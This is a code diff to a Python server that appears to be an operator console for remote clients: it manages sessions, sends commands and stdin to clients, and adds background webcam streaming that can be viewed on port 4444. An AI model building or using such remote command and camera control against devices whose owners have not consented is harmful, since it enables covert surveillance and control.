@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.0.3"
+VERSION = "3.0.4"
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -27,6 +27,7 @@ active_client = None
 result_queue = queue.Queue(maxsize=500)  # (client_id, kind, body)
 camera_frames = {}  # client_id -> latest frame data
 camera_clients = {}  # client_id -> set of http response objects
+streaming_clients = set()  # client_ids currently streaming (not command_running)
 
 
 def get_or_create_client(client_id):
@@ -361,7 +362,7 @@ def input_loop():
         stripped = cmd.strip().lower()
 
         # --- Built-in commands (always handled, even during interactive sessions) ---
-        BUILTINS = {"cancel", "sessions", "status", "help", "exit"}
+        BUILTINS = {"cancel", "sessions", "status", "help", "exit", "stream", "stopstream"}
         BUILTIN_PREFIXES = ("use ", "kill ", "remove ", "get ")
         is_builtin = stripped in BUILTINS or any(stripped.startswith(p) for p in BUILTIN_PREFIXES)
 
@@ -547,8 +548,13 @@ def input_loop():
                 if client["command_running"]:
                     print(f"[!] Command already running on {active_client}. Cancel first.")
                     continue
+                if active_client in streaming_clients:
+                    print(f"[!] Already streaming from {active_client}. Use 'stopstream' first.")
+                    continue
+                # stream runs in background on client — does NOT set command_running
+                # so the operator can still send stopstream / other commands
                 client["pending_command"] = "stream"
-                client["command_running"] = True
+                streaming_clients.add(active_client)
             print(f"[*] Camera stream started on {active_client}")
             print(f"[*] View at: http://localhost:4444/camera?id={active_client}")
             print("[*] Waiting for client to connect...")
@@ -564,10 +570,12 @@ def input_loop():
                 if not client:
                     print(f"[!] Client {active_client} not found.")
                     continue
-                if client["command_running"]:
-                    client["pending_signal"] = "cancel"
-                    client["pending_command"] = None
-                    client["pending_stdin"] = []
+                streaming_clients.discard(active_client)
+                camera_clients.pop(active_client, None)
+                # Send cancel signal only if client is currently streaming
+                client["pending_signal"] = "cancel"
+                client["pending_command"] = None
+                client["pending_stdin"] = []
             print(f"[*] Camera stream stopped on {active_client}")
             continue
 
